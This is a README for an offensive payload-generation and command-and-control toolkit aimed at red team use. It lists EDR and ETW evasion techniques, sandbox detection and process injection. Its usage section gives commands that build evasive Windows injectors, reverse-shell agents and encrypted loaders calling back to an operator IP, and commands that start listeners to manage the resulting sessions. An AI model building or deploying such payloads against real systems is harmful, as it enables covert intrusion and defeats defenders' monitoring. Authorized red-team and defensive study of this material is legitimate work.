<p align="center">
  <a href="#">
    <img src="https://img.shields.io/badge/Core-Python-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Core">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Templates-Jinja2-B41717?style=for-the-badge&logo=jinja&logoColor=white" alt="Templates">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Evasion-Hell's%20Gate-red?style=for-the-badge" alt="Evasion: Hell's Gate">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/OpSec-ETW%20Patching-critical?style=for-the-badge" alt="OpSec: ETW Patching">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Build-Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker">
  </a>
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-black?style=for-the-badge" alt="License">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Release-v1.0-success?style=for-the-badge" alt="Version">
  </a>
</p>

# MultiLangPayloadCLI

**Multi-Language Offensive Security Toolkit & C2 Platform**

A professional-grade framework for generating, obfuscating, and managing offensive security payloads. Designed for Red Team operations, it emphasizes OpSec, evasion, and modern C2 tradecraft.

## 🚀 Features
### **Advanced Evasion & OpSec**
- **Indirect Syscalls (Hell's Gate)**: Bypasses user-mode EDR hooks by resolving SSNs dynamically and executing syscalls via inline assembly.
- **BlockDLLs Policy**: Prevents non-Microsoft DLLs from injecting into the payload process (`0x100000000000`).
- **ETW Patching**: Blinds Event Tracing for Windows by patching `EtwEventWrite` in `ntdll.dll`.
- **Parent Process Spoofing**: Spawns payloads under `explorer.exe` to blend into the process tree.
- **API Hashing**: Uses ROR13 hashing to hide imports. No static strings for sensitive APIs in IAT.
- **Stack Strings**: Constructs sensitive strings (IPs, DLL names) on the stack at runtime to defeat `strings` analysis.
- **Smart Sandbox Evasion**:
  - Checks for realistic hardware (RAM > 4GB, CPU Cores >= 2).
  - Detects virtualization artifacts (VMware/VirtualBox MAC vendors).
- **Control Flow Flattening (CFF)**: Obfuscates C logic using state machines and opaque predicates.

### **C2 Platform**
- **Transport Protocols**:
  - **TCP**: Standard raw sockets.
  - **HTTP**: Malleable HTTP Polling (looks like web browsing).
  - **DNS (DoH)**: (Experimental) Encapsulated command traffic over DNS queries.
- **Session Management**: Full session logging (`logs/sessions/`) and interaction.
- **Audit Logging**: Tracks every operator command in `logs/audit.json` for accountability.

### **Payload Capabilities**
- **Languages**: C (WinAPI/Syscalls), Go, Rust, PowerShell, Bash, Python, JavaScript.
- **Types**:
  - Process Injection (Early Bird APC)
  - Reverse Shells (HTTP, TCP, SSL)
  - Loaders / Stubs (AES-256 Encrypted)
- **Safety Guardrails**:
  - **Kill Date**: Payload self-destructs after a specific date (`--kill-date YYYY-MM-DD`).
  - **Geofencing**: Execution blocked if public IP is not in allowed country (`--geofence US`).

## 🛠 Installation

### Option A: Local Install
1. Clone the repository.
2. Install Python dependencies:
   ```bash
   pip install -r requirements.txt
   ```
3. Ensure you have compilers installed (`gcc`, `mingw-w64`, `go`, `rustc`).

### Option B: Docker (Recommended)
Use the included Docker environment for reproducible builds without polluting your host.
```bash
docker-compose run --rm payload-gen --help
```

## 📖 Usage

Run the CLI using `src/main.py`.

### 1. Payload Generation

**Stealth Windows Injector (C)**
Generates a payload using Indirect Syscalls, ETW Patching, and BlockDLLs.
```bash
python3 src/main.py gen --type inject --os windows --ip 10.10.10.10 --port 443 --obfuscate high --out payload.exe
```

**HTTP Polling Agent (Go)**
Generates a Go agent that polls the C2 server over HTTP.
```bash
python3 src/main.py gen --type reverse-shell --os windows --lang go --ip 10.10.10.10 --port 80 --out agent.exe
```

**OpSec Safe Payload with Guardrails**
Ensures payload only runs in the US and before 2025.
```bash
python3 src/main.py gen --type stub --os windows --ip 10.10.10.10 --port 443 --encrypt \
  --kill-date 2025-01-01 --geofence US --anti-analysis --out loader.exe
```

### 2. C2 Server / Listener

**Start HTTP Listener**
Starts a C2 server listening for HTTP polling agents on port 80.
```bash
python3 src/main.py listen --protocol http --port 80
```

**Start TCP Listener**
Starts a standard raw TCP listener.
```bash
python3 src/main.py listen --protocol tcp --port 4444
```

### 3. C2 Interaction
Once a session connects:
- `list`: Show active sessions.
- `interact <ID>`: Enter session interaction mode.
- `background`: Return to main menu.
- `kill <ID>`: Terminate a session.

## ⚠️ Disclaimer

**ETHICAL WARNING & LEGAL NOTICE**

This tool is developed for **educational purposes** and **authorized Red Team operations only**.
- **DO NOT** use this tool on systems you do not have explicit, written permission to test.
- The authors are not responsible for any damage or legal consequences resulting from the misuse of this software.
- Malicious use of this software is illegal and punishable by law.


## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
